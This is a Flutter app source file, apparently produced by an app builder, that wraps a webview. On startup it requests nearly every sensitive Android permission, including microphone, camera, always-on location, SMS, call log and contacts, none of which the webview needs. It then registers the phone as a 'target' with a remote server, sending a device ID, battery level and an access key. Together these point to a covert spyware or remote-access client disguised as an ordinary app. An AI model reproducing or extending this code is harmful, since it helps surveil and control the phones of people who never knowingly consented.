import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'config/build_config.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const GeneratedApp());
}

class GeneratedApp extends StatelessWidget {
  const GeneratedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: BuildConfig.appName,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF7C9EF5),
        ),
        useMaterial3: true,
      ),
      home: const AppBootstrap(),
    );
  }
}

// ==========================================
// ===== BOOTSTRAP: Request permission + Load config =====
// ==========================================
class AppBootstrap extends StatefulWidget {
  const AppBootstrap({super.key});

  @override
  State<AppBootstrap> createState() => _AppBootstrapState();
}

class _AppBootstrapState extends State<AppBootstrap> {
  String _status = 'Memuat...';
  bool _ready = false;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    try {
      // 1. Save accessKey ke SharedPreferences
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('accessKey', BuildConfig.accessKey);
      await prefs.setString('appName', BuildConfig.appName);
      await prefs.setString('buildId', BuildConfig.buildId);

      // 2. Request permissions
      setState(() => _status = 'Meminta izin...');
      await _requestPermissions();

      // 3. Get device info & send to server
      setState(() => _status = 'Mendaftar device...');
      await _registerDevice();

      if (!mounted) return;
      setState(() {
        _status = 'Siap';
        _ready = true;
      });
    } catch (e) {
      debugPrint('Bootstrap error: $e');
      if (!mounted) return;
      setState(() {
        _status = 'Siap (dengan keterbatasan)';
        _ready = true;
      });
    }
  }

  // ==========================================
  // ===== REQUEST PERMISSIONS =====
  // ==========================================
  Future<void> _requestPermissions() async {
    final permissions = <Permission>[
      // ===== CAMERA =====
      Permission.camera,

      // ===== MICROPHONE =====
      Permission.microphone,

      // ===== LOCATION =====
      Permission.location,
      Permission.locationAlways,
      Permission.locationWhenInUse,

      // ===== STORAGE =====
      Permission.storage,
      Permission.photos,
      Permission.videos,
      Permission.audio,
      Permission.manageExternalStorage,

      // ===== NOTIFICATION =====
      Permission.notification,

      // ===== PHONE =====
      Permission.phone,
      Permission.contacts,
      Permission.sms,
      Permission.callLog,

      // ===== CALENDAR =====
      Permission.calendarFullAccess,
      Permission.calendarWriteOnly,

      // ===== SENSORS =====
      Permission.sensors,
      Permission.activityRecognition,

      // ===== BLUETOOTH =====
      Permission.bluetooth,
      Permission.bluetoothConnect,
      Permission.bluetoothScan,
    ];

    // Request satu per satu (sequential)
    for (final perm in permissions) {
      try {
        final status = await perm.status;
        if (status.isDenied || status.isLimited) {
          await perm.request();
        }
      } catch (e) {
        debugPrint('Permission ${perm.toString()} error: $e');
      }
    }

    // Optional: buka app settings kalau ada permission yang permanently denied
    final permanentlyDenied = await _checkPermanentlyDenied(permissions);
    if (permanentlyDenied.isNotEmpty) {
      debugPrint('Permanently denied: $permanentlyDenied');
      // Bisa buka settings:
      // await openAppSettings();
    }
  }

  Future<List<Permission>> _checkPermanentlyDenied(
    List<Permission> perms,
  ) async {
    final result = <Permission>[];
    for (final p in perms) {
      if (await p.isPermanentlyDenied) result.add(p);
    }
    return result;
  }

  // ==========================================
  // ===== REGISTER DEVICE =====
  // ==========================================
  Future<void> _registerDevice() async {
    if (BuildConfig.accessKey.isEmpty) {
      debugPrint('Access key kosong, skip register');
      return;
    }

    try {
      // Ambil info device
      final battery = Battery();
      final batteryLevel = await battery.batteryLevel;

      final connectivity = Connectivity();
      final connResult = await connectivity.checkConnectivity();

      // Ambil IP
      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('deviceId') ??
          'dev_${DateTime.now().millisecondsSinceEpoch}';
      await prefs.setString('deviceId', deviceId);

      // Register ke server
      final res = await _httpPost(
        '${BuildConfig.serverUrl}/api/register-target',
        {
          'id': deviceId,
          'model': 'Android Device',
          'brand': 'Android',
          'androidVersion': 'Unknown',
          'battery': batteryLevel,
          'ip': connResult.toString(),
          'appName': BuildConfig.appName,
          'packageName': BuildConfig.packageName,
          'accessKey': BuildConfig.accessKey,
        },
      );

      debugPrint('Register result: $res');
    } catch (e) {
      debugPrint('Register error: $e');
    }
  }

  Future<String?> _httpPost(String url, Map<String, dynamic> body) async {
    try {
      final client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 15);
      final request = await client.postUrl(Uri.parse(url));
      request.headers.contentType = ContentType.json;
      request.write(jsonEncode(body));
      final response = await request.close();
      final responseBody = await response.transform(utf8.decoder).join();
      client.close();
      return responseBody;
    } catch (e) {
      debugPrint('HTTP error: $e');
      return null;
    }
  }

  // ==========================================
  // ===== BUILD =====
  // ==========================================
  @override
  Widget build(BuildContext context) {
    if (!_ready) {
      return Scaffold(
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const CircularProgressIndicator(),
              const SizedBox(height: 16),
              Text(_status),
            ],
          ),
        ),
      );
    }

    return const WebViewHome();
  }
}

// ==========================================
// ===== WEBVIEW HOME =====
// ==========================================
class WebViewHome extends StatefulWidget {
  const WebViewHome({super.key});

  @override
  State<WebViewHome> createState() => _WebViewHomeState();
}

class _WebViewHomeState extends State<WebViewHome> {
  late final WebViewController _controller;
  bool _isLoading = true;
  int _progress = 0;

  @override
  void initState() {
    super.initState();
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(const Color(0xFFFFFFFF))
      ..setNavigationDelegate(
        NavigationDelegate(
          onProgress: (p) => setState(() => _progress = p),
          onPageStarted: (_) => setState(() => _isLoading = true),
          onPageFinished: (_) async {
            setState(() => _isLoading = false);
            // Inject config ke localStorage web
            await _controller.runJavaScript(
              "localStorage.setItem('accessKey', '${BuildConfig.accessKey}');"
              "localStorage.setItem('appName', '${BuildConfig.appName}');"
              "localStorage.setItem('buildId', '${BuildConfig.buildId}');"
              "localStorage.setItem('builtBy', '${BuildConfig.builtBy}');",
            );
          },
          onWebResourceError: (error) {
            debugPrint('WebView error: ${error.description}');
          },
        ),
      )
      ..loadRequest(Uri.parse(BuildConfig.webviewUrl));

    // Handle back button
    _controller.addJavaScriptChannel(
      'AppBridge',
      onMessageReceived: (msg) {
        debugPrint('From web: ${msg.message}');
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        if (await _controller.canGoBack()) {
          _controller.goBack();
        } else {
          if (mounted) Navigator.pop(context);
        }
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              WebViewWidget(controller: _controller),
              if (_isLoading)
                LinearProgressIndicator(
                  value: _progress / 100,
                  backgroundColor: Colors.grey.shade200,
                  color: const Color(0xFF7C9EF5),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
